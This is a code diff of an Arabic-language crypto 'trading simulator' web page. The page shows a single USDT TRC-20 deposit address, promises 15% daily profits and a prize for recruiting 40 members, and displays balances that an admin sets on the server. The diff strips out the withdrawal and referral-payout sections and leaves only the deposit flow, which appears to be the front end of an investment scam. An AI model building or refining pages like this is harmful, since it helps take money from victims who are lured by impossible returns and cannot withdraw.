@@ -18,7 +18,7 @@
         .btn-green { background-color: #16A34A; color: white; }
         .btn-cyan { background-color: #0088cc; color: white; }
         .balance-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #1E293B; }
-        .balance-val { color: #A855F7; font-weight: bold; }
+        .balance-val { color: #22C55E; font-weight: bold; }
         .log-box { background-color: #070D19; border: 1px solid #1E293B; border-radius: 6px; height: 60px; padding: 10px; font-size: 12px; color: #A0AEC0; text-align: center; }
     </style>
 </head>
@@ -27,7 +27,7 @@
 <div class="container">
     <div class="header-title">☁️ منظومة محاكي التداول الذكي والتحليل السحابي</div>
 
-    <!-- 1. الاسم -->
+    <!-- 1. الاسم وحفظه -->
     <div class="card">
         <label class="label-text">👤 اسم المستخدم الحالي:</label>
         <input type="text" id="username" placeholder="يرجى إدخال وتثبيت اسم المستخدم أولاً">
@@ -38,7 +38,7 @@
     <div class="card" style="display: flex; justify-content: space-between; align-items: center;">
         <div>
             <span class="label-text">🏆 الجائزة الكبرى (40 عضو)</span>
-            <span style="color: #FBBF24; font-weight: bold;">2500$</span>
+            <span style="color: #FBBF24; font-weight: bold;">2500\$</span>
         </div>
         <div>
             <span class="label-text">أعضاء الفريق النشطين:</span>
@@ -46,79 +46,78 @@
         </div>
     </div>
 
-    <!-- 3. الإحالة البنفسجية -->
-    <div class="card" style="border-color: #6D28D9;">
-        <label class="label-text">🔗 إرسال طلب مكافأة الإحالة (الدعوة):</label>
-        <input type="text" id="invite-code" placeholder="أدخل كود الشخص الذي دعاك">
-        <button class="btn-block btn-purple" onclick="sendToAdmin('طلب مكافأة إحالة')">✨ إرسال المكافأة إلى المشرف</button>
-    </div>
-
-    <!-- 4. الأرصدة الثلاثة -->
+    <!-- 3. الأرصدة الحية المستلمة من السيرفر -->
     <div class="card">
-        <div class="balance-row"><span>إجمالي رأس المال:</span> <span class="balance-val">USDT 0.00</span></div>
-        <div class="balance-row"><span>الأرباح اليومية:</span> <span class="balance-val">USDT 0.00</span></div>
-        <div class="balance-row"><span>أرباح التذاكر ومكافآت الدعوة:</span> <span class="balance-val">USDT 0.00</span></div>
+        <div class="balance-row"><span>إجمالي رأس المال المعتمد:</span> <span class="balance-val" id="user-capital">USDT 0.00</span></div>
+        <div class="balance-row"><span>الأرباح اليومية (%15):</span> <span class="balance-val" style="color: #A855F7;" id="user-profit">USDT 0.00</span></div>
     </div>
 
-    <!-- 5. السحب المباشر (الأزرار الحمراء) -->
-    <div class="card" style="border-color: #DC2626;">
-        <label class="label-text" style="color: #EF4444; text-align: center; font-weight: bold;">🚨 بوابة السحب الفوري المباشر (شبكة TRC-20)</label>
-        <input type="number" id="withdraw-amount" placeholder="المبلغ بـ USDT">
-        <input type="text" id="withdraw-wallet" placeholder="عنوان محفظة TRC-20">
-        
-        <button class="btn-block btn-red" onclick="sendToAdmin('سحب إجمالي رأس المال')">💥 سحب إجمالي رأس المال</button>
-        <button class="btn-block btn-red" onclick="sendToAdmin('سحب الأرباح اليومية')">📊 سحب الأرباح اليومية</button>
-        <button class="btn-block btn-red" onclick="sendToAdmin('سحب مكافأة الدعوة')">💸 سحب مكافأة الدعوة</button>
-    </div>
-
-    <!-- 6. الشحن الأخضر -->
+    <!-- 4. الشحن الأخضر (المبلع المراد إضافته) -->
     <div class="card" style="border-color: #16A34A;">
         <label class="label-text" style="color: #22C55E; text-align: center; font-weight: bold;">💳 محفظة الإيداع الرسمية - شبكة (USDT TRC-20)</label>
         <span style="color: #FBBF24; display:block; text-align:center; font-size:12px; margin-bottom:5px;">TA1vsgrJEFy3YM6rkQWBppnZemFE6c9pBN</span>
-        <input type="number" id="deposit-amount" value="100">
-        <button class="btn-block btn-green" onclick="sendToAdmin('طلب شحن رصيد')">⚡ إرسال طلب الإيداع للمشرف</button>
+        <input type="number" id="deposit-amount" placeholder="أدخل مبلغ الشحن الذي تريده هنا" value="100">
+        <button class="btn-block btn-green" id="btn-deposit" onclick="sendDeposit()">⚡ إرسال طلب الشحن للمشرف</button>
     </div>
 
-    <!-- 7. سجل الإشعارات -->
+    <!-- 5. سجل الإشعارات الحية للمستخدم -->
     <div class="card">
         <label class="label-text">📋 سجل المعاملات والإشعارات الحية</label>
-        <div class="log-box" id="status-logs">يرجى قفل الاسم أولاً...</div>
+        <div class="log-box" id="status-logs">يرجى قفل الاسم أولاً لبدء العمل...</div>
     </div>
 
-    <!-- 8. زر التليجرام -->
+    <!-- 6. زر التليجرام -->
     <button class="btn-block btn-cyan" onclick="window.open('https://t.me', '_blank')">💬 تواصل مع الدعم الفني (invest_support_bot)</button>
 </div>
 
 <script>
+    let activeUsername = "";
+
     function lockUser() {
         const nameInput = document.getElementById('username');
         if(!nameInput.value.trim()) {
             alert("الرجاء إدخال الاسم");
             return;
         }
+        activeUsername = nameInput.value.trim();
         nameInput.disabled = true;
         document.getElementById('save-btn').disabled = true;
-        document.getElementById('status-logs').innerText = "تم تأكيد وتثبيت الاسم بنجاح.";
+        document.getElementById('status-logs').innerText = "تم تأكيد الاسم برمجياً ومراقبة الرصيد الحقيقي...";
+        
+        // جلب رصيد الاسم إذا كان مسجلاً مسبقاً لمنع التصفير
+        checkLiveBalance();
+        setInterval(checkLiveBalance, 2000); // التحقق من الرصيد كل ثانيتين
     }
 
-    function sendToAdmin(actionType) {
-        const name = document.getElementById('username').value;
+    function sendDeposit() {
+        if(!activeUsername) return alert("الرجاء إدخال الاسم وقفله أولاً!");
+        const amt = document.getElementById('deposit-amount').value;
         const logBox = document.getElementById('status-logs');
-        logBox.innerText = "جاري بث الطلب حياً للمشرف...";
+        logBox.innerText = `جاري إرسال طلب شحن بمبلغ ${amt} USDT في انتظار موافقة المشرف...`;
         
         fetch('/api/submit-request', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                username: name || "مستخدم زائر",
-                type: actionType,
-                amount: document.getElementById('withdraw-amount').value || document.getElementById('deposit-amount').value,
-                wallet: document.getElementById('withdraw-wallet').value || "شبكة الإيداع"
+                username: activeUsername,
+                type: "طلب شحن رصيد",
+                amount: amt,
+                wallet: "شبكة الإيداع الرسمية"
             })
         }).then(() => {
-            logBox.innerText = "✔️ تم إرسال الطلب بنجاح للمشرف";
-        }).catch(() => {
-            logBox.innerText = "❌ خطأ في الاتصال";
+            logBox.innerText = `✔️ تم إرسال طلب الـ ${amt} USDT بنجاح! انتظر قبول المشرف لتحديث شاشتك.`;
+        });
+    }
+
+    function checkLiveBalance() {
+        if(!activeUsername) return;
+        fetch(`/api/user-data?username=${encodeURIComponent(activeUsername)}`)
+        .then(res => res.json())
+        .then(data => {
+            if(data.success) {
+                document.getElementById('user-capital').innerText = `USDT ${data.user.totalBalance}`;
+                document.getElementById('user-profit').innerText = `USDT ${data.user.dailyProfit}`;
+            }
         });
     }
 </script>
